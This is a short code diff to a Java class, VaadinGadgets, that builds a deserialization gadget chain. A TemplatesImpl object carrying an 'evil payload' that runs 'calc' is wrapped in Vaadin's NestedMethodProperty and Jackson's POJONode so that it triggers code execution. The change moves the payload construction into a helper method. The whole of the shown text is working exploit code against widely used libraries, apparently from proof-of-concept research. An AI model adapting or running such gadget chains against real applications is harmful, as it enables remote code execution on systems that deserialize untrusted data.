@@ -10,11 +10,7 @@ import javax.xml.transform.Templates;
 
 public class VaadinGadgets {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
-        Utils.setValue(templates , "_name", "gadgets");
-        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         NestedMethodProperty nestedMethodProperty = new NestedMethodProperty<>(templates ,"OutputProperties");
         POJONode pojoNode = new POJONode(nestedMethodProperty);
